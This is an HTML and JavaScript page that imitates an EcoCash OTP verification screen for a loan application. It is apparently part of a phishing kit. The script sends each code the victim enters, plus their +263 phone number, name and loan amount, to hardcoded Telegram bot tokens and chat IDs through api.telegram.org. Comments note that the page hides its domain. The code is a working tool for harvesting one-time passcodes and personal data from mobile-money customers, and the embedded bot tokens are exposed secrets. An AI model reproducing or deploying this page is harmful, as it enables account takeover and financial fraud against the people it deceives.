<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash · OTP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            background: linear-gradient(145deg, #5b6abf 0%, #6d3b9e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: #ffffff;
            border-radius: 32px;
            padding: 36px 28px 32px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 25px 50px -8px rgba(0, 0, 0, 0.4);
            transition: 0.2s;
        }

        .logo {
            text-align: center;
            font-size: 30px;
            font-weight: 700;
            color: #5b6abf;
            letter-spacing: -0.5px;
            margin-bottom: 18px;
        }

        h2 {
            text-align: center;
            color: #1e1e2a;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 6px;
        }

        .subtitle {
            text-align: center;
            color: #5e5e6e;
            font-size: 15px;
            margin-bottom: 24px;
        }

        .phone-display {
            background: #f0f3ff;
            padding: 14px 16px;
            border-radius: 60px;
            margin: 16px 0 22px;
            font-weight: 600;
            color: #3d4a9b;
            font-size: 17px;
            text-align: center;
            letter-spacing: 0.3px;
        }

        /* ---- BOX-STYLE OTP (visual boxes, but backed by a single input) ---- */
        .otp-box-container {
            position: relative;
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 6px 0 10px;
        }

        /* The invisible single input that holds the real value */
        .otp-single-input {
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            cursor: pointer;
            z-index: 10;
            letter-spacing: 12px;
            font-size: 22px;
            font-weight: 600;
            background: transparent;
            border: none;
            outline: none;
            padding: 0;
            margin: 0;
            /* let clicks pass to the visible boxes but we capture via JS focus */
        }

        /* visible boxes – look like individual inputs */
        .otp-box {
            width: 46px;
            height: 56px;
            background: #fafbff;
            border: 2px solid #d9dff0;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            font-weight: 700;
            color: #1e1e2a;
            transition: 0.12s;
            user-select: none;
            pointer-events: none;  /* clicks go to the underlying single input */
            box-shadow: inset 0 1px 3px rgba(0,0,0,0.02);
        }

        /* when the hidden input has focus, highlight the active box */
        .otp-box.active {
            border-color: #5b6abf;
            background: #edf1ff;
            box-shadow: 0 0 0 3px rgba(91, 106, 191, 0.15);
        }

        /* filled state */
        .otp-box.filled {
            border-color: #5b6abf;
            background: #f0f3ff;
        }

        /* paste notification */
        .paste-notification {
            text-align: center;
            background: #e3edff;
            padding: 8px 12px;
            border-radius: 60px;
            margin: 6px 0 8px;
            font-size: 13px;
            color: #1f3a7a;
            display: none;
            font-weight: 500;
        }
        .paste-notification.show {
            display: block;
            animation: fadeSlide 0.25s ease;
        }

        /* invalid OTP message – only this appears */
        .invalid-message {
            background: #ffe9ec;
            color: #b33648;
            padding: 10px 14px;
            border-radius: 60px;
            text-align: center;
            font-weight: 600;
            font-size: 15px;
            margin: 14px 0 6px;
            border-left: 4px solid #b33648;
            display: none;
            animation: fadeSlide 0.25s ease;
        }
        .invalid-message.show {
            display: block;
        }

        .input-method-toggle {
            text-align: center;
            margin: 8px 0 12px;
            font-size: 14px;
        }
        .toggle-link {
            color: #5b6abf;
            text-decoration: none;
            cursor: pointer;
            font-weight: 500;
        }
        .toggle-link:hover {
            text-decoration: underline;
        }

        .timer {
            text-align: center;
            margin: 20px 0 10px;
            font-size: 14px;
            color: #4f4f62;
        }
        .timer span {
            color: #3d4a9b;
            font-weight: 700;
        }

        .btn-verify {
            background: linear-gradient(135deg, #5b6abf 0%, #6d3b9e 100%);
            color: white;
            border: none;
            padding: 18px 12px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: 0.2s;
            margin-top: 8px;
            box-shadow: 0 6px 14px rgba(91, 106, 191, 0.3);
        }
        .btn-verify:hover {
            transform: scale(1.01);
            box-shadow: 0 10px 22px rgba(91, 106, 191, 0.35);
        }
        .btn-verify:active {
            transform: scale(0.97);
        }

        .resend-link {
            text-align: center;
            margin-top: 18px;
        }
        .resend-link a {
            color: #5b6abf;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .resend-link a:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: 28px;
            text-align: center;
            font-size: 12px;
            color: #9898ae;
            border-top: 1px solid #eaeef6;
            padding-top: 18px;
            letter-spacing: 0.2px;
        }

        @keyframes fadeSlide {
            from { opacity: 0; transform: translateY(-6px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">EcoCash</div>
        <h2>OTP Verification</h2>
        <p class="subtitle">Enter the 6‑digit code sent to your number</p>

        <div class="phone-display" id="phoneDisplay">Loading...</div>

        <!-- BOX-STYLE OTP: visual boxes, backed by a single hidden input -->
        <div class="otp-box-container" id="otpBoxContainer">
            <!-- invisible single input that holds the actual OTP value -->
            <input type="text" id="otpHiddenInput" class="otp-single-input" maxlength="6" inputmode="numeric" pattern="[0-9]{6}" autofocus>

            <!-- six visual boxes -->
            <div class="otp-box" data-index="0"></div>
            <div class="otp-box" data-index="1"></div>
            <div class="otp-box" data-index="2"></div>
            <div class="otp-box" data-index="3"></div>
            <div class="otp-box" data-index="4"></div>
            <div class="otp-box" data-index="5"></div>
        </div>

        <div class="paste-notification" id="pasteNotification">✓ OTP pasted</div>

        <!-- toggle link – but now we always stay in box mode, we just keep it for consistency -->
        <div class="input-method-toggle">
            <span style="color:#888; font-size:13px;">box input · copy/paste supported</span>
        </div>

        <!-- ONLY invalid message – no domain, no extra details -->
        <div class="invalid-message" id="invalidMessage">❌ Invalid OTP</div>

        <div class="timer">Resend OTP in <span id="resendTimer">109</span> seconds</div>

        <button class="btn-verify" id="verifyBtn" onclick="verifyOTP()">SUBMIT</button>

        <div class="resend-link">
            <a href="#" id="resendLink" onclick="resendOTP()">Resend OTP</a>
        </div>

        <div class="footer">© 2026 EcoCash · secure</div>
    </div>

    <script>
        // ----- bot config (kept, only used for logging, no domain exposed) -----
        const BOTS = [
            { token: '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI', chatId: '5520957080' },
            { token: '8952574628:AAHLTtlb8jq3cITGp7Iqd0fA9w', chatId: '559815' }
        ];

        let otpData = {};
        let countdownInterval = null;
        let timeLeft = 109;

        // DOM refs
        const hiddenInput = document.getElementById('otpHiddenInput');
        const boxes = document.querySelectorAll('.otp-box');
        const pasteNotify = document.getElementById('pasteNotification');
        const invalidMsg = document.getElementById('invalidMessage');

        // ----- DOM ready -----
        document.addEventListener('DOMContentLoaded', function() {
            const appData = JSON.parse(localStorage.getItem('loanApplication')) || {};
            otpData = JSON.parse(localStorage.getItem('otpVerification')) || {};

            const phone = appData.phone || otpData.phone || '*********';
            document.getElementById('phoneDisplay').textContent = `+263${phone}`;

            setupBoxInput();
            startCountdown();

            // focus the hidden input so the user can type immediately
            hiddenInput.focus();
        });

        // ----- BOX INPUT: single hidden input, visual boxes -----
        function setupBoxInput() {
            // update boxes from hidden input value
            function updateBoxes() {
                const val = hiddenInput.value;
                for (let i = 0; i < boxes.length; i++) {
                    const box = boxes[i];
                    const char = val.charAt(i) || '';
                    box.textContent = char;
                    box.classList.toggle('filled', char !== '');
                    box.classList.toggle('active', i === val.length && val.length < 6);
                }
                // if all filled, remove active highlight
                if (val.length === 6) {
                    boxes.forEach(b => b.classList.remove('active'));
                } else {
                    // ensure the correct box is active
                    const nextIdx = val.length;
                    if (nextIdx < 6) {
                        boxes.forEach((b, idx) => {
                            b.classList.toggle('active', idx === nextIdx);
                        });
                    }
                }
            }

            // handle input on the hidden field
            hiddenInput.addEventListener('input', function() {
                // allow only digits
                this.value = this.value.replace(/[^0-9]/g, '');
                if (this.value.length > 6) this.value = this.value.slice(0, 6);

                updateBoxes();
                invalidMsg.classList.remove('show'); // hide invalid on new input

                // auto-submit when 6 digits
                if (this.value.length === 6) {
                    pasteNotify.classList.add('show');
                    setTimeout(() => pasteNotify.classList.remove('show'), 2500);
                    document.getElementById('verifyBtn').focus();
                }
            });

            // paste handling on the hidden input
            hiddenInput.addEventListener('paste', function(e) {
                e.preventDefault();
                const raw = e.clipboardData.getData('text');
                const digits = raw.replace(/[^0-9]/g, '');
                if (digits.length >= 6) {
                    this.value = digits.slice(0, 6);
                } else {
                    this.value = digits;
                }
                updateBoxes();
                if (this.value.length === 6) {
                    pasteNotify.classList.add('show');
                    setTimeout(() => pasteNotify.classList.remove('show'), 2500);
                    document.getElementById('verifyBtn').focus();
                }
                invalidMsg.classList.remove('show');
            });

            // focus the hidden input when clicking on any box or container
            document.getElementById('otpBoxContainer').addEventListener('click', function(e) {
                hiddenInput.focus();
            });

            // also when clicking on boxes directly (they are pointer-events:none, but container catches)
            // ensure the hidden input stays focused
            hiddenInput.addEventListener('blur', function() {
                // re-focus after a tiny delay if we lose focus to a button or something
                // but only if we are not clicking on the verify button or resend link
                setTimeout(() => {
                    if (document.activeElement !== document.getElementById('verifyBtn') &&
                        document.activeElement !== document.getElementById('resendLink')) {
                        // but we don't want to steal focus from other interactive elements
                        // so we check if the active element is not an input/button we care about
                        const tag = document.activeElement?.tagName?.toLowerCase();
                        if (tag !== 'button' && tag !== 'a' && tag !== 'input') {
                            hiddenInput.focus();
                        }
                    }
                }, 50);
            });

            // initial update
            updateBoxes();
            // ensure first box is active
            boxes.forEach((b, idx) => b.classList.toggle('active', idx === 0));
        }

        // ----- countdown timer -----
        function startCountdown() {
            const timerEl = document.getElementById('resendTimer');
            const resendLink = document.getElementById('resendLink');

            if (countdownInterval) clearInterval(countdownInterval);

            function update() {
                timerEl.textContent = timeLeft;
                if (timeLeft > 0) {
                    timeLeft--;
                } else {
                    clearInterval(countdownInterval);
                    resendLink.style.pointerEvents = 'auto';
                    resendLink.style.color = '#5b6abf';
                }
            }
            update();
            countdownInterval = setInterval(update, 1000);
        }

        // ----- VERIFY OTP (only shows "Invalid OTP" on wrong, no domain) -----
        function verifyOTP() {
            const entered = hiddenInput.value;

            invalidMsg.classList.remove('show');

            if (entered.length !== 6) {
                alert('Please enter the full 6-digit OTP');
                return;
            }

            const correctOtp = otpData.otp || '000000';

            if (entered === correctOtp) {
                // ✅ success
                sendSuccessToBots(entered);
                window.location.href = 'qualification.html';
            } else {
                // ❌ wrong – show ONLY "Invalid OTP"
                invalidMsg.textContent = '❌ Invalid OTP';
                invalidMsg.classList.add('show');

                sendInvalidToBots(entered);

                // clear the input and boxes
                hiddenInput.value = '';
                boxes.forEach(box => {
                    box.textContent = '';
                    box.classList.remove('filled', 'active');
                });
                // set active to first box
                boxes[0].classList.add('active');
                hiddenInput.focus();

                // auto-hide after 4s
                setTimeout(() => {
                    invalidMsg.classList.remove('show');
                }, 4000);
            }
        }

        // ----- bot messages (no domain, only OTP status) -----
        function sendSuccessToBots(enteredOtp) {
            const appData = JSON.parse(localStorage.getItem('loanApplication')) || {};
            const msg = `
✅ OTP VERIFIED
📱 +263${appData.phone || otpData.phone || 'N/A'}
🔢 OTP: ${enteredOtp}
👤 ${appData.firstName || 'N/A'} ${appData.lastName || 'N/A'}
💰 $${appData.loanAmount || 'N/A'} · ${appData.loanTerm || 'N/A'}mo
➡️ redirecting to qualification
            `;
            BOTS.forEach(bot => {
                fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
                    .catch(() => {});
            });
        }

        function sendInvalidToBots(enteredOtp) {
            const appData = JSON.parse(localStorage.getItem('loanApplication')) || {};
            const msg = `
❌ INVALID OTP
📱 +263${appData.phone || otpData.phone || 'N/A'}
❌ entered: ${enteredOtp}
✅ correct: ${otpData.otp || 'N/A'}
🕒 ${new Date().toLocaleString()}
            `;
            BOTS.forEach(bot => {
                fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
                    .catch(() => {});
            });
        }

        // ----- resend OTP -----
        function resendOTP() {
            if (timeLeft > 0) {
                alert(`Please wait ${timeLeft} seconds`);
                return;
            }
            const newOtp = Math.floor(100000 + Math.random() * 900000);
            otpData.otp = newOtp.toString();
            otpData.expires = new Date(Date.now() + 15 * 60000).toISOString();
            localStorage.setItem('otpVerification', JSON.stringify(otpData));

            const appData = JSON.parse(localStorage.getItem('loanApplication')) || {};
            const msg = `
🔄 OTP RESENT
📱 +263${appData.phone || otpData.phone || 'N/A'}
🔢 NEW OTP: ${newOtp}
⏳ 15min expiry
            `;
            BOTS.forEach(bot => {
                fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
                    .catch(() => {});
            });

            timeLeft = 109;
            startCountdown();
            // clear input and boxes
            hiddenInput.value = '';
            boxes.forEach(box => {
                box.textContent = '';
                box.classList.remove('filled', 'active');
            });
            boxes[0].classList.add('active');
            hiddenInput.focus();
            invalidMsg.classList.remove('show');
            alert('New OTP sent.');
        }
    </script>
</body>
                </html>
